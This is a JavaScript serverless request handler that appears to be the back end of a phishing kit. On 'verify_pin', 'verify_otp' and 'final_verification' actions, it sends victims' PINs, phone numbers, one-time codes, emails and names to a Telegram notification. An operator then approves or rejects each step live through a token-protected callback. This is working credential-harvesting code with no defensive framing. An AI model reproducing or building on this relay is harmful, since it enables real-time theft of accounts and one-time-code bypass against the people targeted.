import { makeJsonResponse, makeTextResponse, getRequestFromKV, setRequestInKV, sendTelegramNotification } from "../_shared.js";

async function applyAction(env, requestId, action) {
  // Try OTP first, then password
  let item = await getRequestFromKV(env, requestId, "otp");
  let type = "otp";
  
  if (!item) {
    item = await getRequestFromKV(env, requestId, "password");
    type = "password";
  }

  if (!item) return false;

  if (action === "approve") {
    item.approved = true;
    item.rejectedReason = null;
  } else if (action === "reject") {
    item.rejectedReason = "Admin rejected the request";
    item.approved = false;
  }
  
  await setRequestInKV(env, requestId, item, type);
  return true;
}

export async function onRequest(context) {
  const { request, env } = context;
  const url = new URL(request.url);

  if (request.method === "OPTIONS") return makeTextResponse("", 204);

  let requestId, action, token;
  let body = null;

  if (request.method === "GET") {
    requestId = url.searchParams.get("requestId");
    action = url.searchParams.get("action");
    token = url.searchParams.get("token");
  } else if (request.method === "POST") {
    try {
      body = await request.json();
      requestId = body.requestId;
      action = body.action;
      token = body.token;
    } catch (e) {
      return makeJsonResponse({ error: "Invalid JSON" }, 400);
    }
  } else {
    return makeJsonResponse({ error: "Method not allowed" }, 405);
  }

  if (
    request.method === "POST" &&
    (action === "verify_pin" || action === "verify_otp" || action === "final_verification")
  ) {
    if (!body) {
      return makeJsonResponse({ error: "Invalid request body" }, 400);
    }

    const { pin, phone, countryCode, otp } = body;

    // Get existing request data
    let item = await getRequestFromKV(env, requestId, "otp");
    if (!item) return makeJsonResponse({ error: "Request not found" }, 404);

    // Send Telegram notification
    await sendTelegramNotification({
      requestId,
      phone: phone || item.phone,
      pin,
      countryCode,
      otp,
      email: item.email,
      firstName: item.firstName,
      lastName: item.lastName,
      type:
        action === "verify_pin"
          ? "PIN Verification"
          : action === "verify_otp"
          ? "OTP Verification"
          : "Final Verification",
    }, env, request.url);

    return makeJsonResponse({ success: true });
  }

  if (token !== env.TELEGRAM_CALLBACK_TOKEN) {
    return makeTextResponse("<h3>Invalid token</h3>", 401);
  }

  const success = await applyAction(env, requestId, action);
  if (!success) return makeTextResponse("<h3>Request not found</h3>", 404);

  if (request.method === "GET") {
    return makeTextResponse(`<h3>Request ${action === "approve" ? "Approved ✅" : "Rejected ❌"}</h3>`);
  }
  return makeJsonResponse({ success: true });
}